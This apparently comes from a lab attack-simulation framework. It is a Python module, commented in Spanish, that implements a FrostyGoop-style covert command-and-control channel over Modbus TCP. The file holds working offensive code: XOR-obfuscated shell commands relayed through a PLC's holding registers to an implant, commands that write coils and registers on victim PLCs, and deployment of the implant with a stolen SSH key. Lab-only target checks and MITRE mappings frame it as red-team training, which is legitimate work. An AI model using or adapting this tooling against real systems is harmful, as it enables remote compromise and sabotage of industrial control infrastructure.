#!/usr/bin/env python3
"""
C2 encubierto sobre Modbus TCP — estilo FrostyGoop (S1165).

Implementa un canal de Command & Control que usa un PLC OpenPLC del
laboratorio como «buzón» (storage covert channel): el operador escribe
comandos codificados en holding registers con FC=16, y un implante
desplegado en la máquina comprometida los lee con FC=3, ejecuta la
orden y publica la respuesta en otro rango de registros. Todo el
tráfico es Modbus TCP sintácticamente válido — invisible a reglas
Snort/DPI estándar.

Referentes reales:
  - FrostyGoop (S1165, 2024): Modbus TCP como canal de C2 contra
    infraestructura de calefacción en Lviv, Ucrania.
  - INCONTROLLER/PIPEDREAM (S1045, 2022): C2 sobre Modbus, CODESYS,
    OPC-UA y HTTP/HTTPS contra PLCs industriales.

MITRE ATT&CK for ICS:
  - T0869 Standard Application Layer Protocol (C2 vía protocolo legítimo)
  - T0807 Command-Line Interface
  - T0855 Unauthorized Command Message
  - T0836 Modify Parameter
  - T0882 Theft of Operational Information

Arquitectura:
  ┌────────────┐   FC=16 (write)   ┌────────────┐   FC=3 (read)    ┌─────────────┐
  │  OPERADOR  │ ─────────────────>│ PLC-BUZÓN  │<──────────────── │  IMPLANTE   │
  │ (kali_nodo)│   regs 1000-1105  │ plc_agua_2 │  regs 1000-1105 │(srv_empresa)│
  │            │                   │192.168.10.11│                  │             │
  │            │   FC=3 (read)     │  puerto 502 │  FC=16 (write)  │             │
  │            │ <─────────────────│             │─────────────────>│             │
  │            │   regs 1200-1324  │             │  regs 1200-1324 │             │
  └────────────┘                   └────────────┘                  └─────────────┘

Pensado para ejecutarse DENTRO del contenedor kali_nodo del laboratorio.
Alcance: SOLO IPs de laboratorio (core/runner.assert_lab_target).
"""

import os
import struct
import time

import config
from core import runner, evidence

# ---------------------------------------------------------------------------
# Protocolo de registros
# ---------------------------------------------------------------------------
# Zona de comandos (operador -> implante): registros CMD_BASE .. CMD_BASE+105
# Zona de respuestas (implante -> operador): registros RSP_BASE .. RSP_BASE+124
CMD_BASE = config.C2_CMD_BASE_REG   # 1000
RSP_BASE = config.C2_RSP_BASE_REG   # 1200

# Offsets dentro de la zona de comandos
OFF_MAGIC       = 0    # 0xC2C2 = comando pendiente
OFF_SEQ         = 1    # número de secuencia
OFF_OPCODE      = 2    # 1=shell, 2=write_coil, 3=write_reg, 4=s7_write, 0xFF=exit
OFF_PARAM1      = 3    # parámetro contextual (data_address, etc.)
OFF_PARAM2      = 4    # segundo parámetro (valor, etc.)
OFF_PAYLOAD_LEN = 5    # longitud del payload en bytes
OFF_PAYLOAD     = 6    # inicio del payload (hasta 100 registros = 200 bytes)
CMD_HEADER_LEN  = 6    # registros de cabecera
CMD_PAYLOAD_MAX = 100  # registros de payload

# Offsets dentro de la zona de respuestas
ROFF_MAGIC       = 0   # 0xD1D1 = respuesta lista
ROFF_SEQ_ECHO    = 1   # eco del seq del comando procesado
ROFF_STATUS      = 2   # 0=OK, 1=error
ROFF_PAYLOAD_LEN = 3   # longitud de la respuesta en bytes
ROFF_PAYLOAD     = 4   # inicio del payload respuesta (hasta 121 registros = 242 bytes)
RSP_HEADER_LEN   = 4
RSP_PAYLOAD_MAX  = 121

# Magics
MAGIC_CMD = 0xC2C2
MAGIC_RSP = 0xD1D1

# Opcodes
OP_SHELL         = 0x01
OP_WRITE_COIL    = 0x02
OP_WRITE_REG     = 0x03
OP_EXIT          = 0xFF

OPCODE_NAMES = {
    OP_SHELL: "shell",
    OP_WRITE_COIL: "write_coil",
    OP_WRITE_REG: "write_register",
    OP_EXIT: "exit",
}


# ---------------------------------------------------------------------------
# Codificación / decodificación de payload
# ---------------------------------------------------------------------------

def _xor_bytes(data, key):
    """Aplica XOR cíclico con la clave precompartida (bytes)."""
    if not key:
        return data
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        out[i] = b ^ key[i % klen]
    return bytes(out)


def encode_payload(text, xor_key=None):
    """Codifica un string en una lista de registros Modbus (16-bit unsigned).

    El texto se codifica en UTF-8, se aplica XOR si se pasa clave, y se
    empaqueta en registros big-endian (2 bytes/registro). Si la longitud
    en bytes es impar, se añade un byte de relleno 0x00 al final.

    Devuelve (registers_list, byte_length).
    """
    raw = text.encode("utf-8", errors="replace")
    if len(raw) > CMD_PAYLOAD_MAX * 2:
        raw = raw[:CMD_PAYLOAD_MAX * 2]
    xor_key_bytes = xor_key.encode("utf-8") if isinstance(xor_key, str) else xor_key
    raw = _xor_bytes(raw, xor_key_bytes)
    byte_len = len(raw)
    if len(raw) % 2:
        raw += b"\x00"
    regs = []
    for i in range(0, len(raw), 2):
        regs.append(struct.unpack(">H", raw[i:i+2])[0])
    return regs, byte_len


def decode_payload(registers, byte_length, xor_key=None):
    """Decodifica una lista de registros Modbus a un string UTF-8.

    Deshace la operación de encode_payload.
    """
    raw = b""
    for r in registers:
        raw += struct.pack(">H", r)
    raw = raw[:byte_length]
    xor_key_bytes = xor_key.encode("utf-8") if isinstance(xor_key, str) else xor_key
    raw = _xor_bytes(raw, xor_key_bytes)
    return raw.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Implementación in-process (la ejecuta el subproceso _cli)
# ---------------------------------------------------------------------------

def _mb_write_registers(client, address, values, uid=1):
    """write_registers compatible con pymodbus 3.x (device_id / slave / unit)."""
    for kw in ({"device_id": uid}, {"slave": uid}, {"unit": uid}, {}):
        try:
            return client.write_registers(address, values, **kw)
        except TypeError:
            continue
    raise RuntimeError("write_registers: ninguna signatura funciona")


def _mb_read_holding(client, address, count, uid=1):
    """read_holding_registers compatible con pymodbus 3.x."""
    for kw in ({"count": count, "device_id": uid},
               {"count": count, "slave": uid},
               {"count": count, "unit": uid},
               {"count": count}):
        try:
            return client.read_holding_registers(address, **kw)
        except TypeError:
            continue
    for kw in ({"device_id": uid}, {"slave": uid}, {"unit": uid}, {}):
        try:
            return client.read_holding_registers(address, count, **kw)
        except TypeError:
            continue
    raise RuntimeError("read_holding_registers: ninguna signatura funciona")


def _do_send_command(mailbox_ip, mailbox_port, opcode, param1, param2,
                     payload_text, seq, xor_key, sink):
    """Escribe un comando completo en la zona CMD del PLC-buzón."""
    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        sink("[!] pymodbus no instalado. Ejecuta: pip3 install pymodbus")
        return False

    uid = config.C2_MAILBOX_UID
    sink(f"[*] Conectando a PLC-buzón {mailbox_ip}:{mailbox_port} (UID={uid})...")
    client = ModbusTcpClient(mailbox_ip, port=mailbox_port, timeout=10)
    if not client.connect():
        sink(f"[!] No se pudo conectar a {mailbox_ip}:{mailbox_port}")
        return False

    try:
        payload_regs, payload_bytes = [], 0
        if payload_text:
            payload_regs, payload_bytes = encode_payload(payload_text, xor_key)

        header = [0x0000, seq, opcode, param1, param2, payload_bytes]
        body = header[1:] + payload_regs
        for attempt in range(3):
            try:
                if body:
                    result = _mb_write_registers(client, CMD_BASE + 1,
                                                 body, uid=uid)
                    if result.isError():
                        sink(f"[!] Error escribiendo registros: {result}")
                        return False

                result = _mb_write_registers(client, CMD_BASE,
                                             [MAGIC_CMD], uid=uid)
                if result.isError():
                    sink(f"[!] Error escribiendo magic: {result}")
                    return False
                break
            except Exception as e:
                if attempt < 2:
                    sink(f"[!] Reintentando ({attempt+1}/3): {e}")
                    client.close()
                    time.sleep(1)
                    client = ModbusTcpClient(mailbox_ip,
                                             port=mailbox_port, timeout=10)
                    if not client.connect():
                        sink(f"[!] Reconexión fallida")
                        return False
                else:
                    sink(f"[!] Error tras 3 intentos: {e}")
                    return False

        op_name = OPCODE_NAMES.get(opcode, f"0x{opcode:02X}")
        sink(f"[+] Comando enviado: opcode={op_name}, seq={seq}, "
             f"payload={payload_bytes}B ({len(payload_regs)} regs)")
        return True
    finally:
        client.close()


def _do_poll_response(mailbox_ip, mailbox_port, expected_seq, xor_key,
                      timeout, sink):
    """Hace polling de la zona RSP del PLC-buzón hasta recibir respuesta."""
    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        sink("[!] pymodbus no instalado.")
        return None

    uid = config.C2_MAILBOX_UID
    client = ModbusTcpClient(mailbox_ip, port=mailbox_port, timeout=10)
    if not client.connect():
        sink(f"[!] No se pudo conectar a {mailbox_ip}:{mailbox_port}")
        return None

    try:
        deadline = time.time() + timeout
        poll_interval = config.C2_POLL_INTERVAL
        sink(f"[*] Esperando respuesta (seq={expected_seq}, "
             f"timeout={timeout}s, poll={poll_interval}s)...")

        while time.time() < deadline:
            try:
                rr = _mb_read_holding(client, RSP_BASE, RSP_HEADER_LEN,
                                      uid=uid)
            except Exception:
                client.close()
                time.sleep(poll_interval)
                client = ModbusTcpClient(mailbox_ip, port=mailbox_port,
                                         timeout=10)
                client.connect()
                continue

            if rr.isError():
                time.sleep(poll_interval)
                continue

            magic = rr.registers[ROFF_MAGIC]
            seq_echo = rr.registers[ROFF_SEQ_ECHO]

            if magic == MAGIC_RSP and seq_echo == expected_seq:
                status = rr.registers[ROFF_STATUS]
                payload_len = rr.registers[ROFF_PAYLOAD_LEN]
                response_text = ""

                if payload_len > 0:
                    n_regs = (payload_len + 1) // 2
                    n_regs = min(n_regs, RSP_PAYLOAD_MAX)
                    try:
                        pr = _mb_read_holding(client,
                            RSP_BASE + ROFF_PAYLOAD, n_regs, uid=uid)
                        if not pr.isError():
                            response_text = decode_payload(
                                pr.registers, payload_len, xor_key)
                    except Exception:
                        pass

                try:
                    _mb_write_registers(client, RSP_BASE, [0x0000], uid=uid)
                    _mb_write_registers(client, CMD_BASE, [0x0000], uid=uid)
                except Exception:
                    pass

                status_str = "OK" if status == 0 else "ERROR"
                sink(f"[+] Respuesta recibida: status={status_str}, "
                     f"payload={payload_len}B")
                if response_text:
                    sink(f"[+] Salida:")
                    for line in response_text.splitlines():
                        sink(f"    {line}")
                return {"status": status, "text": response_text}

            time.sleep(poll_interval)

        sink(f"[-] Timeout ({timeout}s): no se recibió respuesta del implante.")
        return None
    finally:
        client.close()


def _do_c2_shell(mailbox_ip, mailbox_port, command, seq, xor_key, timeout, sink):
    """Envía un comando shell y espera la respuesta."""
    sink(f"\n{'─'*60}")
    sink(f"[C2] Shell command: {command}")
    sink(f"{'─'*60}")
    ok = _do_send_command(mailbox_ip, mailbox_port, OP_SHELL,
                          0, 0, command, seq, xor_key, sink)
    if not ok:
        return None
    return _do_poll_response(mailbox_ip, mailbox_port, seq, xor_key,
                             timeout, sink)


def _do_c2_write_coil(mailbox_ip, mailbox_port, target_ip,
                      data_address, value, seq, xor_key, timeout, sink):
    """Envía un comando write_coil al implante."""
    sink(f"\n{'─'*60}")
    sink(f"[C2] OT Attack: WRITE_COIL -> {target_ip} addr={data_address} val={value}")
    sink(f"{'─'*60}")
    ok = _do_send_command(mailbox_ip, mailbox_port, OP_WRITE_COIL,
                          data_address, value, target_ip, seq, xor_key, sink)
    if not ok:
        return None
    return _do_poll_response(mailbox_ip, mailbox_port, seq, xor_key,
                             timeout, sink)


def _do_c2_write_register(mailbox_ip, mailbox_port, target_ip,
                          data_address, value, seq, xor_key, timeout, sink):
    """Envía un comando write_register al implante."""
    sink(f"\n{'─'*60}")
    sink(f"[C2] OT Attack: WRITE_REGISTER -> {target_ip} addr={data_address} val={value}")
    sink(f"{'─'*60}")
    ok = _do_send_command(mailbox_ip, mailbox_port, OP_WRITE_REG,
                          data_address, value, target_ip, seq, xor_key, sink)
    if not ok:
        return None
    return _do_poll_response(mailbox_ip, mailbox_port, seq, xor_key,
                             timeout, sink)


def _do_c2_exit(mailbox_ip, mailbox_port, seq, xor_key, timeout, sink):
    """Envía el comando de finalización al implante."""
    sink(f"\n{'─'*60}")
    sink(f"[C2] Enviando EXIT al implante...")
    sink(f"{'─'*60}")
    ok = _do_send_command(mailbox_ip, mailbox_port, OP_EXIT,
                          0, 0, "", seq, xor_key, sink)
    if not ok:
        return None
    return _do_poll_response(mailbox_ip, mailbox_port, seq, xor_key,
                             timeout, sink)


def _do_deploy_implant(implant_host, ssh_key_path, mailbox_ip, mailbox_port,
                       xor_key, poll_interval, sink):
    """Despliega el implante en la máquina comprometida vía SCP + nohup."""
    implant_src = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "c2_modbus_implant.py")
    if not os.path.exists(implant_src):
        sink(f"[!] No encuentro el implante en {implant_src}")
        return False

    sink(f"[*] Copiando implante a {implant_host}:/tmp/c2_modbus_implant.py ...")
    # SCP con la clave SSH robada (del pivote Samba)
    if not os.path.exists(ssh_key_path):
        sink(f"[!] Clave SSH no encontrada en {ssh_key_path}")
        sink("    Ejecuta primero 'Samba → Descargar clave SSH'.")
        return False

    sink(f"[*] 1/3 — Instalando pymodbus en el host remoto...")
    sink(f"    (si ya está instalado, se omitirá)")

    sink(f"[*] 2/3 — Copiando implante vía SCP...")
    sink(f"    scp -i {ssh_key_path} → root@{implant_host}:/tmp/")

    sink(f"[*] 3/3 — Ejecutando implante en background...")
    xor_arg = f"--xor-key {xor_key}" if xor_key else ""
    sink(f"    python3 /tmp/c2_modbus_implant.py "
         f"--mailbox {mailbox_ip} --port {mailbox_port} "
         f"--poll {poll_interval} {xor_arg}")

    return True


# ---------------------------------------------------------------------------
# Funciones públicas (dashboard) — siguen el patrón de openplc_rce.py
# ---------------------------------------------------------------------------

def _launch_cli(action, args, path, sink):
    """Lanza el subproceso CLI envuelto con proxychains si procede.

    El deploy usa SSH/SCP a srv_empresa (misma red_empresa que kali),
    así que NO necesita proxychains. El resto (shell, write_coil, etc.)
    conecta al PLC-buzón en zona OT y sí lo necesita.
    """
    cmd = ["python3", "-m", "modules._cli.c2_modbus_cli", action] + args
    if action != "deploy":
        cmd = runner.wrap_proxy(cmd)
    runner.run_command(cmd, path, sink=sink, timeout=300, cwd=config.BASE_DIR)


def deploy_implant(implant_host=None, sink=None):
    """Despliega el implante C2 en el host comprometido (T0869, T1570)."""
    host = implant_host or config.SAMBA_HOST
    runner.assert_lab_target(host)
    path = evidence.new_evidence_file("c2_modbus", "deploy_implant")
    evidence.header(
        path,
        "C2 Modbus (FrostyGoop) — Despliegue del implante",
        f"implant_host={host}, mailbox={config.C2_MAILBOX_PLC}:{config.C2_MAILBOX_PORT}",
        config.MITRE_MAP["c2_modbus.deploy_implant"])

    ssh_key = os.path.join(config.WORK_DIR, "id_rsa")
    mailbox = config.C2_MAILBOX_PLC
    port = config.C2_MAILBOX_PORT
    xor_key = config.C2_XOR_KEY
    poll = config.C2_POLL_INTERVAL

    _launch_cli("deploy", [
        "--implant-host", host,
        "--ssh-key", ssh_key,
        "--mailbox", mailbox,
        "--mailbox-port", str(port),
        "--poll", str(poll),
        "--uid", str(config.C2_MAILBOX_UID),
    ] + (["--xor-key", xor_key] if xor_key else []),
        path, sink)
    return path


def c2_shell(command, mailbox=None, port=None, xor_key=None, sink=None):
    """Envía un comando shell al implante vía C2 Modbus (T0869, T0807)."""
    mb = mailbox or config.C2_MAILBOX_PLC
    pt = port or config.C2_MAILBOX_PORT
    xk = xor_key if xor_key is not None else config.C2_XOR_KEY
    runner.assert_lab_target(mb)
    path = evidence.new_evidence_file("c2_modbus", "shell")
    evidence.header(
        path,
        "C2 Modbus (FrostyGoop) — Comando shell encubierto",
        f"mailbox={mb}:{pt}, cmd={command!r}",
        config.MITRE_MAP["c2_modbus.shell"])
    _launch_cli("shell", [
        "--mailbox", mb,
        "--mailbox-port", str(pt),
        "--command", command,
    ] + (["--xor-key", xk] if xk else []),
        path, sink)
    return path


def c2_write_coil(target_ip, data_address=0, value=1,
                  mailbox=None, port=None, xor_key=None, sink=None):
    """Dispara WRITE_COIL en un PLC víctima a través del C2 (T0869, T0855)."""
    mb = mailbox or config.C2_MAILBOX_PLC
    pt = port or config.C2_MAILBOX_PORT
    xk = xor_key if xor_key is not None else config.C2_XOR_KEY
    runner.assert_lab_target(mb)
    runner.assert_lab_target(target_ip)
    path = evidence.new_evidence_file("c2_modbus", "trigger_write_coil")
    evidence.header(
        path,
        "C2 Modbus (FrostyGoop) — Ataque OT: WRITE_COIL vía C2",
        f"mailbox={mb}:{pt}, target={target_ip}, addr={data_address}, val={value}",
        config.MITRE_MAP["c2_modbus.trigger_ot"])
    _launch_cli("write_coil", [
        "--mailbox", mb,
        "--mailbox-port", str(pt),
        "--target-ip", target_ip,
        "--data-address", str(data_address),
        "--value", str(value),
    ] + (["--xor-key", xk] if xk else []),
        path, sink)
    return path


def c2_write_register(target_ip, data_address=0, value=0,
                      mailbox=None, port=None, xor_key=None, sink=None):
    """Dispara WRITE_REGISTER vía C2 (T0869, T0836)."""
    mb = mailbox or config.C2_MAILBOX_PLC
    pt = port or config.C2_MAILBOX_PORT
    xk = xor_key if xor_key is not None else config.C2_XOR_KEY
    runner.assert_lab_target(mb)
    runner.assert_lab_target(target_ip)
    path = evidence.new_evidence_file("c2_modbus", "trigger_write_register")
    evidence.header(
        path,
        "C2 Modbus (FrostyGoop) — Ataque OT: WRITE_REGISTER vía C2",
        f"mailbox={mb}:{pt}, target={target_ip}, addr={data_address}, val={value}",
        config.MITRE_MAP["c2_modbus.trigger_ot"])
    _launch_cli("write_register", [
        "--mailbox", mb,
        "--mailbox-port", str(pt),
        "--target-ip", target_ip,
        "--data-address", str(data_address),
        "--value", str(value),
    ] + (["--xor-key", xk] if xk else []),
        path, sink)
    return path




def c2_exit(mailbox=None, port=None, xor_key=None, sink=None):
    """Envía EXIT al implante (T0869)."""
    mb = mailbox or config.C2_MAILBOX_PLC
    pt = port or config.C2_MAILBOX_PORT
    xk = xor_key if xor_key is not None else config.C2_XOR_KEY
    runner.assert_lab_target(mb)
    path = evidence.new_evidence_file("c2_modbus", "exit")
    evidence.header(
        path,
        "C2 Modbus (FrostyGoop) — Finalización del implante",
        f"mailbox={mb}:{pt}",
        config.MITRE_MAP["c2_modbus.shell"])
    _launch_cli("exit_implant", [
        "--mailbox", mb,
        "--mailbox-port", str(pt),
    ] + (["--xor-key", xk] if xk else []),
        path, sink)
    return path
